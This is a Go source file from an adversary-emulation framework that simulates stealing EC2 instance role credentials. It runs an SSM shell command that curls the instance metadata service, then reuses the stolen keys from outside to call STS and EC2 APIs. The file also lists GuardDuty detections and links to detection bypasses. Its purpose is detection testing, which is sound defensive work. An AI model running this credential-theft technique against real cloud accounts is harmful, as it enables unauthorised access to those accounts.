package aws

import (
	"context"
	_ "embed"
	"encoding/json"
	"errors"
	"log"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ssm"
	"github.com/aws/aws-sdk-go-v2/service/sts"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.credential-access.ec2-steal-instance-credentials",
		FriendlyName: "Steal EC2 Instance Credentials",
		IsSlow:       true,
		Description: `
Simulates the theft of EC2 instance credentials from the Instance Metadata Service.

Warm-up:

- Create the prerequisite EC2 instance and VPC (takes a few minutes).

Detonation:

- Execute a SSM command on the instance to retrieve temporary credentials
- Use these credentials locally (outside the instance) to run the following commands:
	- sts:GetCallerIdentity
	- ec2:DescribeInstances
`,
		Detection: `
GuardDuty provides two findings to identify stolen EC2 instance credentials.

- [InstanceCredentialExfiltration.OutsideAWS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialexfiltrationoutsideaws) identifies EC2 instance credentials used from outside an AWS account.
- [InstanceCredentialExfiltration.InsideAWS
](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialexfiltrationinsideaws) identifies EC2 instance credentials used from a different AWS account than the one of the EC2 instance.

See also: [Known detection bypasses](https://hackingthe.cloud/aws/avoiding-detection/steal-keys-undetected/).
`,
		Platform:           stratus.AWS,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.CredentialAccess},
		FrameworkMappings: []stratus.FrameworkMappings{
			{
				Framework: stratus.ThreatTechniqueCatalogAWS,
				Techniques: []stratus.TechniqueMapping{
					{
						Name: "Unsecured Credentials: Cloud Instance Metadata API",
						ID:   "T1552.005",
						URL:  "https://aws-samples.github.io/threat-technique-catalog-for-aws/Techniques/T1552.005.html",
					},
				},
			},
		},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	log.Println("[STEP] Starting detonation for EC2 Steal Instance Credentials attack")
	ssmClient := ssm.NewFromConfig(providers.AWS().GetConnection())
	instanceId := params["instance_id"]
	instanceRoleName := params["instance_role_name"]

	log.Println("[STEP] Waiting for instance to register in SSM:", instanceId)
	if err := utils.WaitForInstanceToRegisterInSSM(ssmClient, instanceId); err != nil {
		log.Println("[ERROR] Instance did not register in SSM:", err)
		return err
	}

	command := "curl 169.254.169.254/latest/meta-data/iam/security-credentials/" + instanceRoleName + "/"
	log.Println("[STEP] Sending SSM command to instance to retrieve credentials:", command)
	result, err := ssmClient.SendCommand(context.Background(), &ssm.SendCommandInput{
		DocumentName: aws.String("AWS-RunShellScript"),
		InstanceIds:  []string{instanceId},
		Parameters: map[string][]string{
			"commands": {command},
		},
	})
	if err != nil {
		log.Println("[ERROR] Unable to send SSM command:", err)
		return errors.New("unable to send SSM command to instance: " + err.Error())
	}

	log.Println("[STEP] Waiting for SSM command execution to complete")
	commandResult, err := ssm.NewCommandExecutedWaiter(ssmClient).WaitForOutput(context.Background(), &ssm.GetCommandInvocationInput{
		CommandId:  result.Command.CommandId,
		InstanceId: &instanceId,
	}, 2*time.Minute)

	if err != nil {
		log.Println("[ERROR] SSM command execution failed:", err)
		return errors.New("unable to execute SSM commands on instance: " + err.Error())
	}

	log.Println("[STEP] Parsing credentials from instance metadata response")
	metadataResponse := map[string]string{}
	err = json.Unmarshal([]byte(*commandResult.StandardOutputContent), &metadataResponse)
	if err != nil {
		log.Println("[ERROR] Failed to parse credentials:", err)
		return errors.New("unable to parse response from instance metadata " + err.Error())
	}

	log.Println("[STEP] Using stolen credentials to create new AWS session")
	newAwsConnection := utils.AwsConfigFromCredentials(
		metadataResponse["AccessKeyId"],
		metadataResponse["SecretAccessKey"],
		metadataResponse["Token"],
		&providers.AWS().UniqueCorrelationId,
	)
	newStsClient := sts.NewFromConfig(newAwsConnection)
	log.Println("[STEP] Calling sts:GetCallerIdentity with stolen credentials")
	response, _ := newStsClient.GetCallerIdentity(context.Background(), &sts.GetCallerIdentityInput{})
	if response.Arn == nil {
		log.Println("[ERROR] Failed to use stolen credentials for sts:GetCallerIdentity")
		return errors.New("failed to retrieve instance profile credentials (could not run sts:GetCallerIdentity using stolen credentials")
	}

	log.Println("[STEP] Successfully stole temporary instance credentials from the instance metadata service")
	log.Println("[STEP] sts:GetCallerIdentity returned:", *response.Arn)
	log.Println("[STEP] Running benign API call ec2:DescribeInstances using stolen credentials")
	newEc2Client := ec2.NewFromConfig(newAwsConnection)
	_, err = newEc2Client.DescribeInstances(context.Background(), &ec2.DescribeInstancesInput{})

	if err != nil {
		log.Println("[ERROR] Could not use stolen credentials to perform ec2:DescribeInstances:", err)
		return errors.New("could not use stolen instance credentials to perform further AWS API calls: " + err.Error())
	}
	log.Println("[STEP] Successfully completed all steps for EC2 Steal Instance Credentials attack")
	return nil
}
